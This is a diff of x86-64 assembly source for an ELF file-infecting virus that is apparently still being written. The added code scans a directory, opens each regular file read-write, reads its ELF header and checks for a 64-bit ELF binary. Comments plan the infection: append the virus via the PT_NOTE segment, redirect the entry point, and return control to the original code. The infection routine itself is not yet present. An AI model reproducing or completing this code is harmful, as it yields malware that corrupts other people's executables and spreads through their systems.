@@ -66,31 +66,81 @@ iterate_loop:
     cmp byte [r15 + 418 + rcx], 8 ; check if d_type is DT_REG
     jne .go_to_next
     
+    call open_file ; open file
+    cmp rax, 0 ; check for error
+    jbe .go_to_next ; if error, go to next entry
+
+    mov r9, rax ; save file descriptor
+
+    ; read ehdr
+
+    call pread ; read ELF header
+    ; test rax, rax ; check for error
+    ; jz .go_to_next ; if error, go to next entry
+
+
+    ; mov rsi, r15 ; save ELF header address
+    ; add rsi, 144 ; point to ELF header
+    ; mov rdx, 16
+    ; call print_bytes
+
     call hello_world  ; print "Hello, World!"
 
-    ;open file
+    ; check if it's an ELF file
+    cmp dword [r15 + 144], 0x464c457f ; check if it's an ELF file (magic number)
+    jnz .close_file ; if not, go to next entry
 
-    ;read ehdr
 
-    ;check if it's an ELF file
+    cmp byte [r15 + 148], 0x2 ; check if it's a 64-bit ELF file
+    jne .close_file ; if not, go to next entry
 
-    ;iterate over sections to find PT_NOTE
+    ; iterate over sections to find PT_NOTE
 
-    ;infect
-        ;for infection i must append virus to the file, then i must
-        ;modify the entry point to point to the virus
-        ;then i must modify the virus to jump to the original entry point
+    ; infect
+        ; for infection i must append virus to the file, then i must
+        ; modify the entry point to point to the virus
+        ; then i must modify the virus to jump to the original entry point
 
-    ;close file
+    ; close file
 
-    .go_to_next:
-        pop rcx
-        add cx, word [rcx + r15 + 416]
-        cmp rcx, qword [r15 + 350]
-        jne iterate_loop
+.close_file:
+    mov rax, SYS_CLOSE ; syscall number for sys_close
+    mov rdi, r9 ; file descriptor
+    syscall ; invoke operating system to close file
 
-    ;all entries done
-    call restore_stack ; exit
+.go_to_next:
+    pop rcx
+    add cx, word [rcx + r15 + 416]
+    cmp rcx, qword [r15 + 350]
+    jne iterate_loop
+
+; all entries done
+call restore_stack ; exit
+
+open_file:
+    lea rdi, [rcx + r15 + 419] ; filename
+    mov rsi, 2 ; O_RDWR
+    mov rdx, 0 ; mode
+    mov rax, SYS_OPEN ; syscall number for sys_open
+    syscall ; invoke operating system to open file
+    ret
+
+pread:
+    mov rdi, r9 ; file descriptor (use the correct file descriptor)
+    lea rsi, [r15 + 144] ; buffer to store ELF header
+    mov rdx, 64 ; size of ELF header
+    mov r10, 0 ; offset (start of the file)
+    mov rax, 17 ; syscall number for sys_pread64
+    syscall ; invoke operating system to read ELF header
+    ret
+
+print_bytes:
+    ; rsi points to the bytes to print
+    ; rdx is the number of bytes to print
+    mov rax, SYS_WRITE
+    mov rdi, 1 ; stdout
+    syscall
+    ret
 
 close_dir:
     call restore_stack ; exit
